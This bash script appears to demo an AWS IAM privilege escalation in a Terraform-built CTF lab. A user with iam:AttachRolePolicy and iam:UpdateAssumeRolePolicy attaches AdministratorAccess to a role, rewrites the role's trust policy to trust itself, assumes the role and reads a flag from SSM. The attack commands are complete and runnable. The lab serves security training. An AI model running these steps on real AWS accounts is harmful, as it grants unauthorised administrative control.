#!/bin/bash

# Demo script for iam-attachrolepolicy+iam-updateassumerolepolicy privilege escalation
# This scenario demonstrates how a user with iam:AttachRolePolicy and iam:UpdateAssumeRolePolicy
# can attach an admin policy to a role, update the trust policy to allow assumption, then assume it for admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-019-to-admin-starting-user"
TARGET_ROLE="pl-prod-iam-019-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_019_iam_attachrolepolicy_iam_updateassumerolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(OTEL_TRACES_EXPORTER= terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 4.5: Verify starting user does NOT have sts:AssumeRole permission
echo -e "${YELLOW}Step 4.5: Verifying starting user does NOT have sts:AssumeRole permission${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "This is crucial to the attack - the user shouldn't need sts:AssumeRole in their policy"
echo "because being named in a trust policy grants assumption permission from the role's side"
echo ""
echo "Checking starting user's policy for sts:AssumeRole..."
show_cmd "ReadOnly" "aws iam get-user-policy --user-name $STARTING_USER --policy-name pl-prod-iam-019-to-admin-starting-user-policy --query 'PolicyDocument' --output json"
USER_POLICY=$(aws iam get-user-policy \
    --user-name $STARTING_USER \
    --policy-name pl-prod-iam-019-to-admin-starting-user-policy \
    --query 'PolicyDocument' \
    --output json)

if echo "$USER_POLICY" | grep -q "sts:AssumeRole"; then
    echo -e "${RED}⚠ WARNING: User policy contains sts:AssumeRole (not expected for this scenario)${NC}"
else
    echo -e "${GREEN}✓ Confirmed: User policy does NOT contain sts:AssumeRole${NC}"
    echo -e "${GREEN}✓ User will be able to assume role only because they'll be named in trust policy${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Check target role's initial trust policy
echo -e "${YELLOW}Step 5: Checking target role's initial trust policy${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
echo "Target role: $TARGET_ROLE_ARN"
echo ""
echo "Initial trust policy (should NOT trust starting user):"
show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
aws iam get-role \
    --role-name $TARGET_ROLE \
    --query 'Role.AssumeRolePolicyDocument' \
    --output json | jq '.'
echo -e "${GREEN}✓ Confirmed: Starting user not in initial trust policy${NC}\n"

# [OBSERVATION] Step 6: Check target role's current policies
echo -e "${YELLOW}Step 6: Checking target role's current permissions${NC}"
show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
echo "Current attached policies on target role:"
ATTACHED_POLICIES=$(aws iam list-attached-role-policies \
    --role-name $TARGET_ROLE \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output table)

if [ -z "$ATTACHED_POLICIES" ] || [ "$ATTACHED_POLICIES" == "None" ]; then
    echo "  (No managed policies attached)"
else
    echo "$ATTACHED_POLICIES"
fi
echo -e "${GREEN}✓ Target role currently has no admin access${NC}\n"

# [EXPLOIT] Step 7: Attach AdministratorAccess policy to target role
echo -e "${YELLOW}Step 7: Attaching AdministratorAccess policy to target role${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the first privilege escalation action!"
echo ""

show_attack_cmd "Attacker" "aws iam attach-role-policy --role-name $TARGET_ROLE --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\""
aws iam attach-role-policy \
    --role-name $TARGET_ROLE \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy to target role${NC}\n"

# Wait for policy to propagate (15 seconds required for IAM changes)
echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# [OBSERVATION] Step 8: Verify policy was attached
echo -e "${YELLOW}Step 8: Verifying policy attachment${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
echo "Updated attached policies on target role:"
aws iam list-attached-role-policies \
    --role-name $TARGET_ROLE \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output table

echo -e "${GREEN}✓ AdministratorAccess policy is now attached${NC}\n"

# [EXPLOIT] Step 9: Update the role's trust policy to allow the starting user to assume it
echo -e "${YELLOW}Step 9: Updating target role trust policy${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the second privilege escalation action!"
echo "Modifying trust policy to explicitly allow: $CURRENT_USER"
echo ""

# Create the new trust policy that includes the starting user
TRUST_POLICY=$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$CURRENT_USER"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
)

show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document \"\$TRUST_POLICY\""
aws iam update-assume-role-policy \
    --role-name $TARGET_ROLE \
    --policy-document "$TRUST_POLICY"

echo -e "${GREEN}✓ Successfully updated trust policy${NC}\n"

# Wait for trust policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for trust policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Trust policy propagated${NC}\n"

# [OBSERVATION] Step 10: Verify the trust policy was updated
echo -e "${YELLOW}Step 10: Verifying trust policy update${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Current trust policy:"
show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
aws iam get-role \
    --role-name $TARGET_ROLE \
    --query 'Role.AssumeRolePolicyDocument' \
    --output json | jq '.'

echo -e "${GREEN}✓ Trust policy now allows starting user to assume the role${NC}\n"

# [EXPLOIT] Step 11: Assume the target role
echo -e "${YELLOW}Step 11: Assuming the target role with admin permissions${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Role ARN: $TARGET_ROLE_ARN"
echo ""
echo "Note: Starting user does NOT have sts:AssumeRole permission"
echo "However, when a principal is explicitly named in a trust policy,"
echo "they can assume the role without needing sts:AssumeRole permission!"
echo ""

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $TARGET_ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"

# [OBSERVATION] Step 12: Verify administrator access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 13: Capture the CTF flag from SSM Parameter Store
echo -e "${YELLOW}Step 13: Capturing the CTF flag${NC}"
# Role session credentials are already active from the assume-role step above
export AWS_REGION=$AWS_REGION
echo "Reading CTF flag from SSM Parameter Store using admin role session..."
echo ""

show_attack_cmd "Attacker (admin role)" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-019-to-admin --query 'Parameter.Value' --output text"
CTF_FLAG=$(aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-019-to-admin \
    --query 'Parameter.Value' \
    --output text)

if [ -z "$CTF_FLAG" ] || [ "$CTF_FLAG" == "None" ]; then
    echo -e "${RED}✗ Failed to retrieve CTF flag${NC}"
else
    echo -e "${GREEN}✓ CTF Flag captured: $CTF_FLAG${NC}"
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (no admin or sts:AssumeRole permissions)"
echo "2. Used iam:AttachRolePolicy to attach AdministratorAccess to: $TARGET_ROLE"
echo "3. Used iam:UpdateAssumeRolePolicy to modify trust policy to allow starting user"
echo "4. Assumed the role (works without sts:AssumeRole because explicitly named in trust)"
echo "5. Achieved: Full administrative access to the AWS account"
echo "6. Captured CTF flag from SSM Parameter Store"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (iam:AttachRolePolicy) → $TARGET_ROLE (attach admin)"
echo "  → (iam:UpdateAssumeRolePolicy) → $TARGET_ROLE trust (allow starting user)"
echo "  → (sts:AssumeRole) → Admin Access"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AdministratorAccess policy attached to: $TARGET_ROLE"
echo "- Trust policy modified on: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The target role now has administrative permissions and modified trust policy!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
